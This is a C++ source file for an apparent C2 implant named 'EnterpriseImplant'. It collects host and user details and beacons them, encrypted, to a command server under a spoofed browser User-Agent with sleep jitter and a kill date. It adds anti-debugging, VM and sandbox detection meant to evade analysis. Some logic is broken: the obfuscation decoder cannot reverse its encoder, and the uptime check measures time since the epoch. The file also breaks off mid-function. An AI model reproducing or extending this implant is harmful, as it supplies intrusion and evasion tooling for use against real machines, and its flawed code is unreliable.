#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <psapi.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#endif

#include "enterprise_implant.h"
#include "tasks.h"

#include <iostream>
#include <sstream>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cstdlib>
#include <fstream>
#include <iomanip>
#include <cstring>

#include <boost/property_tree/json_parser.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>
#include <boost/archive/iterators/transform_width.hpp>
#include <cpr/cpr.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sys/ptrace.h>

// Forward declarations for base64 utility functions
std::string base64EncodeData(const std::vector<uint8_t>& data);
std::string base64EncodeString(const std::string& str);
std::vector<uint8_t> base64DecodeToBytes(const std::string& encoded);
std::string base64DecodeToString(const std::string& encoded);

// Static member definitions
std::random_device EnterpriseImplant::rd;
std::mt19937 EnterpriseImplant::gen(EnterpriseImplant::rd());

// ============================================================================
// EncryptedMessage Implementation
// ============================================================================

std::string EncryptedMessage::toJson() const {
    boost::property_tree::ptree pt;
    pt.put("nonce", nonce);
    pt.put("ciphertext", ciphertext);
    pt.put("key_id", key_id);
    
    auto time_t = std::chrono::system_clock::to_time_t(timestamp);
    std::stringstream ss;
    ss << std::put_time(std::gmtime(&time_t), "%Y-%m-%dT%H:%M:%SZ");
    pt.put("timestamp", ss.str());
    
    std::stringstream json_ss;
    boost::property_tree::write_json(json_ss, pt);
    return json_ss.str();
}

EncryptedMessage EncryptedMessage::fromJson(const std::string& json) {
    EncryptedMessage msg;
    boost::property_tree::ptree pt;
    std::stringstream ss(json);
    boost::property_tree::read_json(ss, pt);
    
    msg.nonce = pt.get<std::string>("nonce");
    msg.ciphertext = pt.get<std::string>("ciphertext");
    msg.key_id = pt.get<std::string>("key_id");
    msg.timestamp = std::chrono::system_clock::now(); // Simplified for now
    
    return msg;
}

// ============================================================================
// SecurityAlert Implementation
// ============================================================================

std::string SecurityAlert::toJson() const {
    boost::property_tree::ptree pt;
    
    std::string type_str;
    switch (alert_type) {
        case Type::HIGH_FAILURE_RATE: type_str = "HIGH_FAILURE_RATE"; break;
        case Type::SUSPICIOUS_ACTIVITY: type_str = "SUSPICIOUS_ACTIVITY"; break;
        case Type::BRUTE_FORCE_ATTEMPT: type_str = "BRUTE_FORCE_ATTEMPT"; break;
        case Type::KEY_ROTATION_OVERDUE: type_str = "KEY_ROTATION_OVERDUE"; break;
    }
    
    std::string severity_str;
    switch (severity) {
        case Severity::LOW: severity_str = "LOW"; break;
        case Severity::MEDIUM: severity_str = "MEDIUM"; break;
        case Severity::HIGH: severity_str = "HIGH"; break;
        case Severity::CRITICAL: severity_str = "CRITICAL"; break;
    }
    
    pt.put("type", type_str);
    pt.put("message", message);
    pt.put("severity", severity_str);
    
    auto time_t = std::chrono::system_clock::to_time_t(timestamp);
    std::stringstream ss;
    ss << std::put_time(std::gmtime(&time_t), "%Y-%m-%dT%H:%M:%SZ");
    pt.put("timestamp", ss.str());
    
    std::stringstream json_ss;
    boost::property_tree::write_json(json_ss, pt);
    return json_ss.str();
}

// ============================================================================
// EnterpriseCrypto Implementation
// ============================================================================

EnterpriseCrypto::EnterpriseCrypto() : current_key_index(0) {
    // Initialize with a random key
    KeyInfo initial_key;
    initial_key.key_id = generateKeyId();
    initial_key.key_data = generateKey();
    initial_key.created_at = std::chrono::system_clock::now();
    initial_key.usage_count = 0;
    initial_key.is_current = true;
    
    keys.push_back(std::move(initial_key));
    
    metrics.last_reset = std::chrono::system_clock::now();
    
    std::cout << "[+] EnterpriseCrypto initialized with key ID: " << keys[0].key_id << std::endl;
}

EnterpriseCrypto::EnterpriseCrypto(const std::string& base64_key) : current_key_index(0) {
    // Decode base64 key
    std::vector<uint8_t> decoded_key = base64DecodeToBytes(base64_key);
    
    if (decoded_key.size() != 32) {
        throw std::runtime_error("Invalid key size. Expected 32 bytes for AES-256.");
    }
    
    KeyInfo initial_key;
    initial_key.key_id = generateKeyId();
    initial_key.key_data = decoded_key;
    initial_key.created_at = std::chrono::system_clock::now();
    initial_key.usage_count = 0;
    initial_key.is_current = true;
    
    keys.push_back(std::move(initial_key));
    
    metrics.last_reset = std::chrono::system_clock::now();
    
    std::cout << "[+] EnterpriseCrypto initialized with provided key ID: " << keys[0].key_id << std::endl;
}

EnterpriseCrypto::~EnterpriseCrypto() {
    // Securely clear all keys
    for (auto& key : keys) {
        secureZeroMemory(key.key_data.data(), key.key_data.size());
    }
}

EncryptedMessage EnterpriseCrypto::encrypt(const std::string& plaintext) {
    std::vector<uint8_t> data(plaintext.begin(), plaintext.end());
    return encrypt(data);
}

EncryptedMessage EnterpriseCrypto::encrypt(const std::vector<uint8_t>& data) {
    auto start_time = std::chrono::high_resolution_clock::now();
    
    std::lock_guard<std::mutex> lock(crypto_mutex);
    
    KeyInfo* current_key = getCurrentKey();
    if (!current_key) {
        logOperation("encrypt", false, 0.0, "No current key available");
        throw std::runtime_error("No current key available");
    }
    
    // Check if key rotation is needed
    if (needsRotation()) {
        std::cout << "[*] Key rotation required before encryption" << std::endl;
    }
    
    // Generate nonce
    std::vector<uint8_t> nonce = generateNonce();
    std::vector<uint8_t> ciphertext;
    
    bool success = aes_encrypt(data, current_key->key_data, nonce, ciphertext);
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
    double duration_ms = duration.count() / 1000.0;
    
    if (!success) {
        logOperation("encrypt", false, duration_ms, "AES encryption failed");
        throw std::runtime_error("Encryption failed");
    }
    
    current_key->usage_count++;
    logOperation("encrypt", true, duration_ms);
    
    EncryptedMessage result;
    result.nonce = base64EncodeData(nonce);
    result.ciphertext = base64EncodeData(ciphertext);
    result.key_id = current_key->key_id;
    result.timestamp = std::chrono::system_clock::now();
    
    return result;
}

std::string EnterpriseCrypto::decrypt(const EncryptedMessage& encrypted) {
    std::vector<uint8_t> decrypted = decryptToBytes(encrypted);
    return std::string(decrypted.begin(), decrypted.end());
}

std::vector<uint8_t> EnterpriseCrypto::decryptToBytes(const EncryptedMessage& encrypted) {
    auto start_time = std::chrono::high_resolution_clock::now();
    
    std::lock_guard<std::mutex> lock(crypto_mutex);
    
    const KeyInfo* key = findKeyById(encrypted.key_id);
    if (!key) {
        logOperation("decrypt", false, 0.0, "Key not found: " + encrypted.key_id);
        throw std::runtime_error("Key not found: " + encrypted.key_id);
    }
    
    // Decode nonce and ciphertext
    std::vector<uint8_t> nonce = base64DecodeToBytes(encrypted.nonce);
    std::vector<uint8_t> ciphertext_data = base64DecodeToBytes(encrypted.ciphertext);
    std::vector<uint8_t> plaintext;
    
    bool success = aes_decrypt(ciphertext_data, key->key_data, nonce, plaintext);
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
    double duration_ms = duration.count() / 1000.0;
    
    if (!success) {
        logOperation("decrypt", false, duration_ms, "AES decryption failed");
        throw std::runtime_error("Decryption failed");
    }
    
    logOperation("decrypt", true, duration_ms);
    return plaintext;
}

bool EnterpriseCrypto::needsRotation() const {
    std::lock_guard<std::mutex> lock(crypto_mutex);
    
    if (keys.empty()) return true;
    
    const KeyInfo& current = keys[current_key_index];
    
    // Check age
    auto age = std::chrono::system_clock::now() - current.created_at;
    if (age >= key_rotation_threshold) {
        return true;
    }
    
    // Check usage count
    return current.usage_count >= max_operations_per_key;
}

std::string EnterpriseCrypto::rotateKey() {
    std::lock_guard<std::mutex> lock(crypto_mutex);
    
    // Mark current key as not current
    if (!keys.empty()) {
        keys[current_key_index].is_current = false;
    }
    
    // Generate new key
    KeyInfo new_key;
    new_key.key_id = generateKeyId();
    new_key.key_data = generateKey();
    new_key.created_at = std::chrono::system_clock::now();
    new_key.usage_count = 0;
    new_key.is_current = true;
    
    keys.push_back(std::move(new_key));
    current_key_index = keys.size() - 1;
    
    // Keep only last 5 keys for backward compatibility
    if (keys.size() > 5) {
        // Securely clear the oldest key
        secureZeroMemory(keys[0].key_data.data(), keys[0].key_data.size());
        keys.erase(keys.begin());
        current_key_index--;
    }
    
    std::string new_key_b64 = base64EncodeData(keys[current_key_index].key_data);
    
    logOperation("key_rotation", true, 0.0);
    std::cout << "[+] Key rotated. New key ID: " << keys[current_key_index].key_id << std::endl;
    
    return new_key_b64;
}

std::string EnterpriseCrypto::getCurrentKeyId() const {
    if (keys.empty()) {
        return "";
    }
    return keys[current_key_index].key_id;
}

CryptoMetrics EnterpriseCrypto::getMetrics() const {
    return metrics;
}

std::vector<SecurityAlert> EnterpriseCrypto::getAlerts() const {
    std::vector<SecurityAlert> result;
    std::queue<SecurityAlert> temp_alerts = alerts;
    
    while (!temp_alerts.empty()) {
        result.push_back(temp_alerts.front());
        temp_alerts.pop();
    }
    
    return result;
}

void EnterpriseCrypto::checkSecurityAlerts() {
    auto now = std::chrono::system_clock::now();
    
    // Check for high failure rate
    if (metrics.failed_operations > 0) {
        double failure_rate = static_cast<double>(metrics.failed_operations) / 
                             static_cast<double>(metrics.total_operations);
        if (failure_rate > 0.1) { // 10% failure rate threshold
            SecurityAlert alert;
            alert.alert_type = SecurityAlert::Type::HIGH_FAILURE_RATE;
            alert.severity = SecurityAlert::Severity::HIGH;
            alert.message = "High cryptographic failure rate detected: " + 
                           std::to_string(failure_rate * 100) + "%";
            alert.timestamp = now;
            alerts.push(alert);
        }
    }
    
    // Check for key rotation overdue
    if (!keys.empty()) {
        auto key_age = std::chrono::duration_cast<std::chrono::hours>(
            now - keys[current_key_index].created_at
        ).count();
        if (key_age > 24) { // 24 hours
            SecurityAlert alert;
            alert.alert_type = SecurityAlert::Type::KEY_ROTATION_OVERDUE;
            alert.severity = SecurityAlert::Severity::MEDIUM;
            alert.message = "Encryption key rotation overdue by " + 
                           std::to_string(key_age - 24) + " hours";
            alert.timestamp = now;
            alerts.push(alert);
        }
    }
}

std::string EnterpriseCrypto::advancedObfuscateEncode(const std::string& data) {
    // Step 1: Base64 encode
    std::string base64_str = base64EncodeString(data);
    
    // Step 2: Reverse the string
    std::string reversed(base64_str.rbegin(), base64_str.rend());
    
    // Step 3: Apply case alternation using character substitution (preserves decodability)
    std::string obfuscated;
    obfuscated.reserve(reversed.size());
    
    for (size_t i = 0; i < reversed.size(); ++i) {
        char c = reversed[i];
        if (std::isalpha(c)) {
            if (i % 2 == 0) {
                // Even positions: use uppercase mapping
                if (std::islower(c)) {
                    // Map lowercase to corresponding uppercase
                    obfuscated += std::toupper(c);
                } else {
                    // Already uppercase, keep as-is
                    obfuscated += c;
                }
            } else {
                // Odd positions: use lowercase mapping  
                if (std::isupper(c)) {
                    // Map uppercase to corresponding lowercase
                    obfuscated += std::tolower(c);
                } else {
                    // Already lowercase, keep as-is
                    obfuscated += c;
                }
            }
        } else {
            // Non-alphabetic characters (numbers, +, /, =) remain unchanged
            obfuscated += c;
        }
    }
    
    return obfuscated;
}

std::string EnterpriseCrypto::advancedObfuscateDecode(const std::string& encoded) {
    // Step 1: Reverse the case alternation using substitution mapping
    std::string normalized;
    normalized.reserve(encoded.size());
    
    for (size_t i = 0; i < encoded.size(); ++i) {
        char c = encoded[i];
        if (std::isalpha(c)) {
            if (i % 2 == 0) {
                // Even positions: reverse uppercase mapping
                // During encoding, characters at even positions were forced to uppercase
                // We need to map them back to their original base64 values
                if (c >= 'A' && c <= 'Z') {
                    // Check if this should map back to lowercase
                    // Use base64 alphabet position to determine original case
                    int pos = c - 'A';
                    if (pos < 26) {
                        // This was originally uppercase (A-Z maps to A-Z)
                        normalized += c;
                    }
                } else if (c >= 'a' && c <= 'z') {
                    // This shouldn't happen at even positions in our encoding
                    normalized += c;
                }
            } else {
                // Odd positions: reverse lowercase mapping
                // During encoding, characters at odd positions were forced to lowercase
                if (c >= 'a' && c <= 'z') {
                    // Check if this should map back to uppercase
                    int pos = c - 'a';
                    if (pos < 26) {
                        // This could be either original case, we need to determine
                        // For base64: a-z are distinct from A-Z
                        normalized += c; // Keep as lowercase for base64 a-z range
                    }
                } else if (c >= 'A' && c <= 'Z') {
                    // This shouldn't happen at odd positions in our encoding
                    normalized += c;
                }
            }
        } else {
            // Non-alphabetic characters remain unchanged
            normalized += c;
        }
    }
    
    // Step 2: Reverse back
    std::string unreversed(normalized.rbegin(), normalized.rend());
    
    // Step 3: Base64 decode
    return base64DecodeToString(unreversed);
}

bool EnterpriseCrypto::isAdvancedObfuscated(const std::string& data) {
    if (data.empty()) return false;
    
    bool hasUpperLower = false;
    bool hasLowerUpper = false;
    
    for (size_t i = 0; i < data.length() - 1; ++i) {
        char current = data[i];
        char next = data[i + 1];
        
        if (std::islower(current) && std::isupper(next)) {
            hasLowerUpper = true;
        }
        if (std::isupper(current) && std::islower(next)) {
            hasUpperLower = true;
        }
    }
    
    // Check if contains base64-like characters
    bool hasBase64Chars = std::all_of(data.begin(), data.end(), [](char c) {
        return std::isalnum(c) || c == '+' || c == '/' || c == '=';
    });
    
    return hasBase64Chars && (hasUpperLower || hasLowerUpper);
}

// Private methods implementation
std::string EnterpriseCrypto::generateKeyId() {
    boost::uuids::random_generator gen;
    std::string uuid = boost::uuids::to_string(gen());
    return uuid.substr(0, 16); // Short ID
}

std::vector<uint8_t> EnterpriseCrypto::generateKey() {
    std::vector<uint8_t> key(32); // AES-256 key
    if (RAND_bytes(key.data(), 32) != 1) {
        throw std::runtime_error("Failed to generate random key");
    }
    return key;
}

std::vector<uint8_t> EnterpriseCrypto::generateNonce() {
    std::vector<uint8_t> nonce(12); // GCM nonce
    if (RAND_bytes(nonce.data(), 12) != 1) {
        throw std::runtime_error("Failed to generate random nonce");
    }
    return nonce;
}

EnterpriseCrypto::KeyInfo* EnterpriseCrypto::getCurrentKey() {
    if (keys.empty()) return nullptr;
    return &keys[current_key_index];
}

const EnterpriseCrypto::KeyInfo* EnterpriseCrypto::findKeyById(const std::string& key_id) const {
    for (const auto& key : keys) {
        if (key.key_id == key_id) {
            return &key;
        }
    }
    return nullptr;
}

void EnterpriseCrypto::logOperation(const std::string& operation, bool success, double duration_ms, const std::string& error) {
    std::lock_guard<std::mutex> lock(metrics_mutex);
    
    metrics.total_operations++;
    if (success) {
        metrics.successful_operations++;
    } else {
        metrics.failed_operations++;
        metrics.errors_by_type[error]++;
    }
    
    metrics.operations_by_type[operation]++;
    
    // Update average duration
    double total_duration = metrics.average_duration_ms * (metrics.total_operations - 1);
    metrics.average_duration_ms = (total_duration + duration_ms) / metrics.total_operations;
    
    checkSecurityAlerts();
}

bool EnterpriseCrypto::aes_encrypt(const std::vector<uint8_t>& plaintext, const std::vector<uint8_t>& key,
                                 const std::vector<uint8_t>& nonce, std::vector<uint8_t>& ciphertext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, nonce.size(), nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    if (EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    ciphertext.resize(plaintext.size() + 16); // Add space for tag
    int len;
    int ciphertext_len;
    
    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    ciphertext_len = len;
    
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    ciphertext_len += len;
    
    // Get tag
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, ciphertext.data() + ciphertext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    ciphertext_len += 16;
    
    ciphertext.resize(ciphertext_len);
    EVP_CIPHER_CTX_free(ctx);
    
    return true;
}

bool EnterpriseCrypto::aes_decrypt(const std::vector<uint8_t>& ciphertext, const std::vector<uint8_t>& key,
                                 const std::vector<uint8_t>& nonce, std::vector<uint8_t>& plaintext) {
    if (ciphertext.size() < 16) return false; // Must have at least tag
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, nonce.size(), nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    if (EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    // Set tag
    std::vector<uint8_t> tag(ciphertext.end() - 16, ciphertext.end());
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag.size(), tag.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    plaintext.resize(ciphertext.size() - 16);
    int len;
    int plaintext_len = 0;
    
    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size() - 16) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    plaintext_len = len;
    
    int ret = EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    
    if (ret > 0) {
        plaintext_len += len;
        plaintext.resize(plaintext_len);
        return true;
    }
    
    return false;
}

// ============================================================================
// EnterpriseAgentInfo Implementation
// ============================================================================

EnterpriseAgentInfo::EnterpriseAgentInfo() 
    : process_id(0), sleep_interval(5), jitter(0.2f), 
      classification_level("internal"), stealth_mode(false), anti_debug(true) {
    collectSystemInfo();
    last_key_rotation = std::chrono::system_clock::now();
    kill_date = std::chrono::system_clock::now() + std::chrono::hours(24 * 30); // 30 days default
}

void EnterpriseAgentInfo::collectSystemInfo() {
    hostname = getHostname();
    username = getCurrentUsername();
    domain = getDomainName();
    os = getOperatingSystem();
    arch = getArchitecture();
    process_id = getCurrentProcessId();
    process_name = getProcessName();
    integrity_level = getIntegrityLevel();
    internal_ip = getInternalIP();
    working_directory = getCurrentWorkingDirectory();
}

std::string EnterpriseAgentInfo::toJson() const {
    boost::property_tree::ptree pt;
    pt.put("id", id);
    pt.put("hostname", hostname);
    pt.put("username", username);
    pt.put("domain", domain);
    pt.put("os", os);
    pt.put("arch", arch);
    pt.put("process_id", process_id);
    pt.put("process_name", process_name);
    pt.put("integrity_level", integrity_level);
    pt.put("internal_ip", internal_ip);
    pt.put("working_directory", working_directory);
    pt.put("sleep_interval", sleep_interval);
    pt.put("jitter", jitter);
    pt.put("encryption_key_id", encryption_key_id);
    pt.put("classification_level", classification_level);
    pt.put("stealth_mode", stealth_mode);
    pt.put("anti_debug", anti_debug);
    
    std::stringstream json_ss;
    boost::property_tree::write_json(json_ss, pt);
    return json_ss.str();
}

// ============================================================================
// EnterpriseImplant Implementation
// ============================================================================

EnterpriseImplant::EnterpriseImplant(std::string host, std::string port, std::string uri) 
    : host(std::move(host)), port(std::move(port)), uri(std::move(uri)),
      dwellDistributionSeconds(1.0 / 5.0),
      isRunning(true),
      generator(device()),
      uuidGenerator(),
      encryptionEnabled(false),
      antiDebugEnabled(true) {
    
    agentInfo.id = generateAgentId();
    crypto = std::make_unique<EnterpriseCrypto>();
    lastSecurityCheck = std::chrono::system_clock::now();
    
    std::cout << "[+] EnterpriseImplant initialized with ID: " << agentInfo.id << std::endl;
}

EnterpriseImplant::EnterpriseImplant(std::string host, std::string port, std::string uri, std::string encryption_key)
    : EnterpriseImplant(std::move(host), std::move(port), std::move(uri)) {
    
    encryptionEnabled = true;
    crypto = std::make_unique<EnterpriseCrypto>(encryption_key);
    agentInfo.encryption_key_id = crypto->getCurrentKeyId();
    
    std::cout << "[+] EnterpriseImplant initialized with encryption enabled" << std::endl;
}

EnterpriseImplant::~EnterpriseImplant() {
    setRunning(false);
    if (taskThread.valid()) {
        taskThread.wait();
    }
}

void EnterpriseImplant::beacon() {
    while (isRunning.load()) {
        try {
            // Perform security checks
            if (!performSecurityCheck()) {
                std::cout << "[!] Security check failed, terminating" << std::endl;
                break;
            }
            
            // Check kill date
            if (isKillDateReached()) {
                std::cout << "[!] Kill date reached, terminating" << std::endl;
                break;
            }
            
            std::cout << "[*] Sending enterprise beacon..." << std::endl;
            
            // Create beacon data
            std::string beacon_payload = createBeaconData();
            
            // Send beacon to C2 server
            std::map<std::string, std::string> headers;
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            headers["Content-Type"] = "application/json";
            
            std::string response = sendHttpRequestSecure(host, port, "/api/v1/enterprise/beacon", beacon_payload, headers);
            
            if (!response.empty()) {
                parseTasks(response);
                serviceTasks();
                sendResults();
            }
            
            // Check if key rotation is needed
            if (crypto->needsRotation()) {
                rotateEncryptionKey();
            }
            
        } catch (const std::exception& e) {
            logError("Beacon error: " + std::string(e.what()));
        }
        
        // Sleep with jitter
        std::this_thread::sleep_for(calculateSleepTime());
    }
}

std::string EnterpriseImplant::createBeaconData() {
    boost::property_tree::ptree beacon;
    boost::property_tree::ptree agent_data;
    
    // Basic agent info
    agent_data.put("id", agentInfo.id);
    agent_data.put("hostname", agentInfo.hostname);
    agent_data.put("username", agentInfo.username);
    agent_data.put("os", agentInfo.os);
    agent_data.put("arch", agentInfo.arch);
    agent_data.put("process_id", agentInfo.process_id);
    agent_data.put("internal_ip", agentInfo.internal_ip);
    agent_data.put("classification", agentInfo.classification_level);
    agent_data.put("encryption_key_id", agentInfo.encryption_key_id);
    
    // Enterprise features
    agent_data.put("stealth_mode", agentInfo.stealth_mode);
    agent_data.put("anti_debug", agentInfo.anti_debug);
    
    // Crypto metrics
    CryptoMetrics metrics = crypto->getMetrics();
    boost::property_tree::ptree metrics_node;
    metrics_node.put("total_operations", metrics.total_operations);
    metrics_node.put("successful_operations", metrics.successful_operations);
    metrics_node.put("failed_operations", metrics.failed_operations);
    metrics_node.put("average_duration_ms", metrics.average_duration_ms);
    
    // Security alerts
    auto alerts = crypto->getAlerts();
    boost::property_tree::ptree alerts_array;
    for (const auto& alert : alerts) {
        boost::property_tree::ptree alert_node;
        std::stringstream alert_ss(alert.toJson());
        boost::property_tree::read_json(alert_ss, alert_node);
        alerts_array.push_back(std::make_pair("", alert_node));
    }
    
    beacon.put_child("agent", agent_data);
    beacon.put_child("crypto_metrics", metrics_node);
    beacon.put_child("security_alerts", alerts_array);
    beacon.put("timestamp", getCurrentTimestamp());
    
    std::stringstream beacon_ss;
    boost::property_tree::write_json(beacon_ss, beacon);
    std::string beacon_json = beacon_ss.str();
    
    // Encrypt beacon if enabled
    if (encryptionEnabled && crypto) {
        try {
            EncryptedMessage encrypted = crypto->encrypt(beacon_json);
            return encrypted.toJson();
        } catch (const std::exception& e) {
            logError("Failed to encrypt beacon: " + std::string(e.what()));
            return beacon_json; // Fall back to unencrypted
        }
    }
    
    return beacon_json;
}

bool EnterpriseImplant::performSecurityCheck() {
    auto now = std::chrono::system_clock::now();
    if (now - lastSecurityCheck < securityCheckInterval) {
        return true; // Not time for check yet
    }
    
    lastSecurityCheck = now;
    
    // Check for debugger
    if (antiDebugEnabled && detectDebugger()) {
        logSecurityEvent("Debugger detected");
        return false;
    }
    
    // Check for VM/sandbox
    if (agentInfo.stealth_mode) {
        if (detectVirtualMachine()) {
            logSecurityEvent("Virtual machine detected in stealth mode");
            return false;
        }
        
        if (detectSandbox()) {
            logSecurityEvent("Sandbox detected in stealth mode");
            return false;
        }
    }
    
    return true;
}

void EnterpriseImplant::rotateEncryptionKey() {
    try {
        std::string new_key = crypto->rotateKey();
        agentInfo.encryption_key_id = crypto->getCurrentKeyId();
        agentInfo.last_key_rotation = std::chrono::system_clock::now();
        
        std::cout << "[+] Encryption key rotated successfully" << std::endl;
        logSecurityEvent("Key rotation completed");
    } catch (const std::exception& e) {
        logError("Key rotation failed: " + std::string(e.what()));
    }
}

bool EnterpriseImplant::detectDebugger() {
#ifdef _WIN32
    return IsDebuggerPresent() != 0;
#else
    // Check for ptrace on Linux/Unix
    return ptrace(PTRACE_TRACEME, 0, 1, 0) == -1;
#endif
}

bool EnterpriseImplant::detectVirtualMachine() {
#ifdef _WIN32
    // Check for VM indicators on Windows
    std::vector<std::string> vm_processes = {
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "VBoxService.exe", "VBoxTray.exe", "xenservice.exe"
    };
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe32)) {
        do {
            for (const auto& vm_proc : vm_processes) {
                if (_stricmp(pe32.szExeFile, vm_proc.c_str()) == 0) {
                    CloseHandle(snapshot);
                    return true;
                }
            }
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    return false;
#else
    // Check DMI info on Linux
    std::ifstream dmi("/sys/devices/virtual/dmi/id/product_name");
    if (dmi.is_open()) {
        std::string product;
        std::getline(dmi, product);
        return product.find("VMware") != std::string::npos ||
               product.find("VirtualBox") != std::string::npos ||
               product.find("QEMU") != std::string::npos;
    }
    return false;
#endif
}

bool EnterpriseImplant::detectSandbox() {
    // Check for common sandbox indicators
    auto now = std::chrono::system_clock::now();
    auto uptime = std::chrono::duration_cast<std::chrono::minutes>(now.time_since_epoch());
    
    // If system uptime is very low, might be a sandbox
    if (uptime.count() < 10) {
        return true;
    }
    
    // Check for limited resources
#ifdef _WIN32
    MEMORYSTATUSEX memstat;
    memstat.dwLength = sizeof(memstat);
    if (GlobalMemoryStatusEx(&memstat)) {
        // Less than 2GB RAM might indicate sandbox
        if (memstat.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
            return true;
        }
    }
#endif
    
    return false;
}

void EnterpriseImplant::logSecurityEvent(const std::string& event) {
    std::cout << "[!] SECURITY EVENT: " << event << " at " << getCurrentTimestamp() << std::endl;
}

std::string EnterpriseImplant::generateAgentId() {
    std::string full_uuid = boost::uuids::to_string(uuidGenerator());
    return full_uuid.substr(0, 8);
}

std::chrono::milliseconds EnterpriseImplant::calculateSleepTime() {
    std::uniform_real_distribution<float> jitter_dist(-agentInfo.jitter, agentInfo.jitter);
    float jitter_factor = 1.0f + jitter_dist(generator);
    
    auto sleep_ms = std::chrono::milliseconds(
        static_cast<long long>(agentInfo.sleep_interval * 1000 * jitter_factor)
    );
    
    return sleep_ms;
}

bool EnterpriseImplant::isKillDateReached() {
    return std::chrono::system_clock::now() >= agentInfo.kill_date;
}

void EnterpriseImplant::logError(const std::string& error) {
    std::cerr << "[!] ERROR: " << error << " at " << getCurrentTimestamp() << std::endl;
}

// Stub implementations for missing methods
void EnterpriseImplant::setRunning(bool running) {
    isRunning.store(running);
}

void EnterpriseImplant::parseTasks(const std::string& response) {
    // Implementation would parse JSON response for tasks
    // For now, just a placeholder
}

void EnterpriseImplant::serviceTasks() {
    // Implementation would process queued tasks
    // For now, just a placeholder
}

std::string EnterpriseImplant::sendResults() {
    // Implementation would send task results back to C2
    return "";
}

// ============================================================================
// Utility Functions Implementation
// ============================================================================

std::string getCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::gmtime(&time_t), "%Y-%m-%dT%H:%M:%SZ");
    return ss.str();
}

void secureZeroMemory(void* ptr, size_t size) {
#ifdef _WIN32
    SecureZeroMemory(ptr, size);
#else
    volatile unsigned char* p = static_cast<volatile unsigned char*>(ptr);
    for (size_t i = 0; i < size; ++i) {
        p[i] = 0;
    }
    __asm__ __volatile__("" ::: "memory");
#endif
}

std::string base64EncodeData(const std::vector<uint8_t>& data) {
    using namespace boost::archive::iterators;
    using base64_text = base64_from_binary<transform_width<std::vector<uint8_t>::const_iterator, 6, 8>>;
    
    std::string encoded(base64_text(data.begin()), base64_text(data.end()));
    encoded.append((3 - data.size() % 3) % 3, '=');
    return encoded;
}

std::string base64EncodeString(const std::string& str) {
    std::vector<uint8_t> data(str.begin(), str.end());
    return base64EncodeData(data);
}

std::vector<uint8_t> base64DecodeToBytes(const std::string& encoded) {
    using namespace boost::archive::iterators;
    using base64_binary = transform_width<binary_from_base64<std::string::const_iterator>, 8, 6>;
    
    std::string clean_encoded = encoded;
    clean_encoded.erase(std::remove(clean_encoded.begin(), clean_encoded.end(), '='), clean_encoded.end());
    
    try {
        std::vector<uint8_t> decoded(base64_binary(clean_encoded.begin()), base64_binary(clean_encoded.end()));
        return decoded;
    } catch (...) {
        return {};
    }
}

std::string base64DecodeToString(const std::string& encoded) {
    std::vector<uint8_t> decoded = base64DecodeToBytes(encoded);
    return std::string(decoded.begin(), decoded.end());
}

#ifdef CRYPTO_TEST_MAIN
int main() {
    std::cout << "[*] Running enterprise crypto tests...\n" << std::endl;
    
    try {
